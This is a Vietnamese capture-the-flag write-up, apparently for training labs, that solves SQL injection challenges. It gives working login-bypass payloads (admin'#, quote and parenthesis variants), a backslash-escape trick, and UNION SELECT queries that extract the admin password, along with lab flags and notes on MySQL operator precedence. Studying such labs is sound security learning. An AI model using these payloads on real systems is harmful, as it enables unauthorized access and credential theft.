## SQL INJECTION ##

# INTERACTIVE LEARNING 

1. Login
2. Login level 2
3. Search
SELECT * FROM news WHERE content LIKE '%'UNION SELECT username, password FROM users WHERE username='admin'#%'


# LAB

# Db

Ở mục sandbox

<img width="722" height="133" alt="image" src="https://github.com/user-attachments/assets/38a6573a-4ffe-4dc7-8cc3-62f80680ca4b" />

<img width="803" height="144" alt="image" src="https://github.com/user-attachments/assets/7f3927d2-e1df-4eea-8786-113ad880e454" />

`CBJS{da6d016bf546bfd86b8808136ebc8bc0}`

# 1. Basic 1

<img width="629" height="85" alt="image" src="https://github.com/user-attachments/assets/c5557324-30e4-48ee-9ad6-914367dfb9c9" />

Payload `admin'#`
--> `string(70) "SELECT username FROM users WHERE username='admin'#' AND password='aaa'"`

<img width="527" height="23" alt="image" src="https://github.com/user-attachments/assets/69806d4c-dd60-4237-8b4c-d898517c2f6d" />


CBJS{da6d016bf546bfd86b8808136ebc8bc0}

# 2. Basic 2

<img width="644" height="74" alt="image" src="https://github.com/user-attachments/assets/8ec34554-73fa-4aa3-9668-8c8c9d496c3b" />

Tương tự nhưng thay bằng dấu nháy kép

<img width="667" height="49" alt="image" src="https://github.com/user-attachments/assets/4b3e36ca-8957-4e40-85df-32e4343a8d15" />

Payload `admin"#`

CBJS{f8ef24f0eebdfa5defdabc632f494f3e}

# 3. Basic 3

<img width="670" height="59" alt="image" src="https://github.com/user-attachments/assets/cb376bf9-1745-4c52-bf93-30ce2129a2ca" />

Payload `admin")#`

CBJS{4f629fe490901e261258d977a47f96e1}

# 4. Basic 4

<img width="526" height="72" alt="image" src="https://github.com/user-attachments/assets/3bf7cf80-6b90-41d0-bf2c-7b5934c45d96" />

Hàm check valid có nhiệm vụ check xem trong input có chứa dấu doublelash không

`   $sql = "SELECT username FROM users WHERE username=LOWER(\"$username\") AND password=MD5(\"$password\")"; `

Xuất hiện dấu  `\`

<img width="522" height="270" alt="image" src="https://github.com/user-attachments/assets/79d37ecf-2048-4f4e-9c34-cecb0a8ec0e4" />

Có tác dụng bỏ ý nghĩa đặc biệt của ký tự --> chuyển thành string

Ví dụ với input như sau

<img width="608" height="21" alt="image" src="https://github.com/user-attachments/assets/d138463c-20de-4e2c-b62b-b76b76dbeaf4" />

<img width="676" height="41" alt="image" src="https://github.com/user-attachments/assets/0bb73d8f-0230-469d-933d-5e6d42f4d56b" />

Trong khi đó code chỉ kiểm tra username

`$row = $query->fetch_assoc(); // Get the first row`

Code chỉ kiểm tra dòng đầu tiên, tức là SQLi có thể tạo ra nhiều dòng nhưng php chỉ lấy dòng đầu tiên

Ta thử dùng `\` làm input cho username

`LOWER(\"$username\")`

 Mà 
 ```
"      → bắt đầu chuỗi
\ "    → dấu " được escape, không đóng chuỗi
```

Từ đó input của username sẽ là `\” AND password=MD5(`

Vậy ta sẽ có

SELECT username FROM users
WHERE username=LOWER("\")
AND password=MD5(") 
UNION SELECT 'admin'#")

CBJS{44682b8def08e0fe9cdcb079e7db4dc0}

# 5. Basic 5

<img width="615" height="191" alt="image" src="https://github.com/user-attachments/assets/cef82685-c218-411c-aa87-03f5d4706ce1" />

Giờ code check cả username và password

Nên ta sẽ tìm cách để sql trả về kết quả cả 2 giá trị username password 

<img width="425" height="359" alt="image" src="https://github.com/user-attachments/assets/73e878fd-60dc-4c30-a164-5d6d2ceff489" />

Nhưng hàm check password còn hash input để so với dbs

<img width="611" height="134" alt="image" src="https://github.com/user-attachments/assets/017d59d0-2df9-4c40-97ed-3afd8b2d7ef5" />

Chú ý thông báo còn trả về thông tin này 
 Vậy ta phải tìm ra payload để thông báo này trả về password của tài khoản admin

<img width="437" height="358" alt="image" src="https://github.com/user-attachments/assets/4be4c8f5-a66e-4b4b-baf4-188d6773266a" />

 `SELECT username, password FROM users WHERE username='aaaa' union select password, 1 from users where username='admin' `

 <img width="818" height="364" alt="image" src="https://github.com/user-attachments/assets/6ebfc6a5-4cdd-4be9-aad8-5b5082b92291" />

Lấy giá trị đầu tiên từ  result test của SQL 


# NOTE

Thứ tự thực thi 

```
INTERVAL
BINARY, COLLATE
!
- (unary minus), ~ (unary bit inversion)
^
*, /, DIV, %, MOD
-, +
<<, >>
&
|
= (comparison), <=>, >=, >, <=, <, <>, !=, IS, LIKE, REGEXP, IN, MEMBER OF
BETWEEN, CASE, WHEN, THEN, ELSE
NOT
AND, &&
XOR
OR, ||
= (assignment), :=
```



Tại sao `SELECT * FROM username='a' OR '1' AND password=''` output lại là 0 row ?

VÌ đoạn `'1' AND password=''` sẽ được thực thi trước 

<img width="360" height="214" alt="image" src="https://github.com/user-attachments/assets/81c4f4f7-d726-4a47-9047-bfee88654ef4" />

Tức là nguyên cụm đó sẽ là FALSE 
Mà không có username nà chỉ tên là 'a'
